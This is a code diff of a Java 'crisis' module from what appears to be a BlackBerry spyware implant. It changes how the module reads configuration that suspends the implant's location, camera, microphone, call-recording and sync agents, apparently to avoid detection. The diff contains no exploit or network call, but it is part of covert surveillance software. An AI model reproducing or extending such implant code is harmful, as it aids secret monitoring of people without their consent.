@@ -9,10 +9,9 @@
  * *************************************************/
 package blackberry.module;
 
-import java.io.EOFException;
-
-import net.rim.device.api.util.DataBuffer;
 import blackberry.Status;
+import blackberry.config.ConfModule;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -28,34 +27,47 @@ public final class ModuleCrisis extends BaseModule {
     public static final int NONE = 0x0; // Per retrocompatibilita'
     public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location Agent
     public static final int CAMERA = 0x2; // Inibisci il Camera Agent
-    public static final int MIC = 0x4; // Inibisci la registrazione del microfono
-    public static final int CALL = 0x8; // Inibisci l'agente di registrazione delle chiamate
-    public static final int SYNC = 0x10; // Inibisci tutte le routine di sincronizzazione
-    public static final int ALL = 0xffffffff; // Per retrocompatibilita'
+    public static final int MIC = 0x3; // Inibisci la registrazione del microfono
+    public static final int CALL = 0x4; // Inibisci l'agente di registrazione delle chiamate
+    public static final int SYNC = 0x5; // Inibisci tutte le routine di sincronizzazione
+    public static final int SIZE = 0x6;
 
-    int type;
-
-    /**
-     * Instantiates a new crisis agent.
-     * 
-     * @param agentStatus
-     *            the agent status
+    /*
+     * (non-Javadoc)
+     * @see blackberry.agent.Agent#parse(byte[])
      */
-    public ModuleCrisis(final boolean agentEnabled) {
-        super(BaseModule.AGENT_CRISIS, agentEnabled, false, "CrisisAgent");
+    public boolean parse(ConfModule conf) {
+
+        Status status = Status.self();
+        try {
+            if (conf.getBoolean("synchronize")) {
+                status.setCrisis(SYNC, true);
+            }
+            if (conf.getBoolean("call")) {
+                status.setCrisis(CALL, true);
+            }
+            if (conf.getBoolean("mic")) {
+                status.setCrisis(MIC, true);
+            }
+            if (conf.getBoolean("camera")) {
+                status.setCrisis(CAMERA, true);
+            }
+            if (conf.getBoolean("position")) {
+                status.setCrisis(POSITION, true);
+            }
+        } catch (ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.trace(" (parse) Error: " + e);
+            //#endif
+            return false;
+        }
+
+        return true;
     }
 
-    /**
-     * Instantiates a new crisis agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleCrisis(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
+    public void actualStart() {
+        Status.getInstance().startCrisis();
+        Evidence.info("Crisis started");
     }
 
     /*
@@ -66,52 +78,11 @@ public final class ModuleCrisis extends BaseModule {
 
     }
 
-    public void actualStart() {
-        Status.getInstance().startCrisis();
-        Evidence.info("Crisis started");
-    }
-
     public void actualStop() {
         Status.getInstance().stopCrisis();
-        if(running){
+        if (running) {
             Evidence.info("Crisis stopped");
         }
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParameters) {
-
-        if (confParameters.length == 0) {
-            // backward compatibility
-            Status.getInstance().setCrisis(0xffffffff);
-            //#ifdef DEBUG
-            debug.info("old configuration: " + type);
-            //#endif
-            return true;
-        }
-
-        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
-                confParameters.length, false);
-
-        try {
-            type = databuffer.readInt();
-        } catch (final EOFException e) {
-            //#ifdef DEBUG
-            debug.error(e);
-            //#endif
-            return false;
-        }
-
-        //#ifdef DEBUG
-        debug.info("type: " + type);
-        //#endif
-
-        Status.getInstance().setCrisis(type);
-
-        return true;
     }
 
 }
